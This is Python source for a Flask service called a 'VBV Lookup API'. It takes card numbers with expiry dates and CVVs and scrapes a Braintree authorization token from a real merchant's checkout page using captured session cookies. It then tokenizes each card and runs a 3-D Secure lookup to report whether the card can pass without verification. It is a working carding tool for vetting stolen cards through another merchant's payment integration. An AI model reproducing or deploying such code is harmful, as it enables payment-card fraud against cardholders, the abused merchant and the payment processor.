from flask import Flask, request, jsonify
import requests
import base64
import re
import time
import os

app = Flask(__name__)

# Your VBV lookup function
def vbv_lookup(card_number, exp_month, exp_year, cvv):
    start_time = time.time()
    
    try:
        cookies = {
            'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
            'wmc_current_currency': 'EUR',
            'wmc_current_currency_old': 'EUR',
            'wp_woocommerce_session_c8b09fd6a66f1378f0ed5a3909218785': 't_8d207563a5f105d8499fdcf4f5a887%7C1764399234%7C1764312834%7C%24generic%24D6NyqUApl44ZKzJCeN9c4GNm61mtwGxQ0Gt035Fc',
            'cmplz_consented_services': '',
            'cmplz_policy_id': '37',
            'cmplz_marketing': 'allow',
            'cmplz_statistics': 'allow',
            'cmplz_preferences': 'allow',
            'cmplz_functional': 'allow',
            'cmplz_banner-status': 'dismissed',
            '_ga': 'GA1.1.480019427.1764226438',
            '_fbp': 'fb.1.1764226438173.435378032875134316',
            'et-editor-available-post-633-fb': 'fb',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-27%2006%3A31%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcart%2F',
            'sbjs_first_add': 'fd%3D2025-11-27%2006%3A31%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcart%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.xlifter.com%2Fcheckout-page%2F',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': 'c6b9602f0b5218735a0378908f5cccdd',
            '_ga_G5EET4Q5MQ': 'GS2.1.s1764226437$o1$g1$t1764226923$j34$l0$h0',
            '_gcl_au': '1.1.1507767560.1764226437.1720276993.1764226641.1764226976',
        }

        headers = {
            'authority': 'www.xlifter.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'referer': 'https://www.xlifter.com/cart/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get('https://www.xlifter.com/checkout-page/', cookies=cookies, headers=headers, timeout=30)
        wiz = response.text.find('wc_braintree_client_token = ["')
        wiz1 = response.text.find('"]', wiz)
        encoded_text = response.text[wiz +30:wiz1]
        decode_text = base64.b64decode(encoded_text).decode('utf-8')
        wizard = re.findall('"authorizationFingerprint":"(.*?)"',decode_text)[0]

        # Step 3 graphql
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {wizard}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': 'e5256d53-e797-4f6c-81ab-1934222cc154',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': exp_month,
                        'expirationYear': exp_year,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
        wizard1 = (response.json()['data']['tokenizeCreditCard']['token'])

        # LookUp
        headers = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.xlifter.com',
            'referer': 'https://www.xlifter.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'amount': '585.00',
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'en-GB',
            'browserScreenHeight': 804,
            'browserScreenWidth': 360,
            'browserTimeZone': -330,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'shippingGivenName': 'Wiz',
                'shippingSurname': 'Ff',
                'ipAddress': '122.172.78.201',
                'billingLine1': 'NY',
                'billingLine2': 'NY',
                'billingCity': 'NY',
                'billingState': 'NY',
                'billingPostalCode': '10080',
                'billingCountryCode': 'US',
                'billingPhoneNumber': '3542268895',
                'billingGivenName': 'Wiz',
                'billingSurname': 'Ff',
                'shippingLine1': 'NY',
                'shippingLine2': 'NY',
                'shippingCity': 'NY',
                'shippingState': 'NY',
                'shippingPostalCode': '10080',
                'shippingCountryCode': 'US',
                'email': 'wizardlyaura999@gmail.com',
            },
            'bin': card_number[:6],
            'dfReferenceId': '0_3e9470ab-e16a-416e-9ac9-aa46e66a12ac',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.133.0',
                'cardinalDeviceDataCollectionTimeElapsed': 16,
                'issuerDeviceDataCollectionTimeElapsed': 5494,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': f'{wizard}',
            'braintreeLibraryVersion': 'braintree/web/3.133.0',
            '_meta': {
                'merchantAppId': 'www.xlifter.com',
                'platform': 'web',
                'sdkVersion': '3.133.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '5128134e-36d3-4fdb-91f2-96bdfeae902a',
            },
        }

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/8mw6d8gxn9cmjh8t/client_api/v1/payment_methods/{wizard1}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
            timeout=30
        )

        end_time = time.time()
        elapsed_time = end_time - start_time

        result = response.json()
        
        # Extract status
        if 'paymentMethod' in result and 'threeDSecureInfo' in result['paymentMethod']:
            status = result['paymentMethod']['threeDSecureInfo'].get('status', 'N/A')
        else:
            status = 'NOT_FOUND'
        
        return {
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'status': status,
            'elapsed_time': elapsed_time,
            'success': True,
            'bin': card_number[:6]
        }

    except Exception as e:
        end_time = time.time()
        elapsed_time = end_time - start_time
        return {
            'card': f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            'status': f"ERROR: {str(e)}",
            'elapsed_time': elapsed_time,
            'success': False,
            'bin': card_number[:6]
        }

@app.route('/')
def home():
    return jsonify({
        "message": "VBV Lookup API by BLAZE_X_007",
        "endpoint": "/gateway?key=blazedev&card=cc|mm|yy|cvv",
        "usage": "Send GET request with card details to check VBV status"
    })

@app.route('/gateway')
def gateway():
    # Get parameters
    key = request.args.get('key')
    card = request.args.get('card')
    
    # Validate API key
    if key != 'blazedev':
        return jsonify({
            "success": False,
            "error": "Invalid API key"
        }), 401
    
    # Validate card parameter
    if not card:
        return jsonify({
            "success": False,
            "error": "Card parameter is required"
        }), 400
    
    # Parse card details
    if '|' in card:
        parts = card.split('|')
    else:
        parts = card.split()
    
    if len(parts) != 4:
        return jsonify({
            "success": False,
            "error": "Invalid card format. Use: cc|mm|yy|cvv"
        }), 400
    
    card_number, exp_month, exp_year, cvv = parts
    
    # Validate card number length
    if len(card_number) < 13 or len(card_number) > 19:
        return jsonify({
            "success": False,
            "error": "Invalid card number length"
        }), 400
    
    # Perform VBV lookup
    try:
        result = vbv_lookup(
            card_number.strip(),
            exp_month.strip(),
            exp_year.strip(),
            cvv.strip()
        )
        
        return jsonify({
            "success": result['success'],
            "card": result['card'],
            "bin": result.get('bin', ''),
            "status": result['status'],
            "elapsed_time": result['elapsed_time'],
            "developer": "BLAZE_X_007"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Processing error: {str(e)}"
        }), 500

# Health check endpoint for Render
@app.route('/health')
def health():
    return jsonify({"status": "healthy", "service": "VBV Lookup API"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 6080))
    app.run(host='0.0.0.0', port=port, debug=False)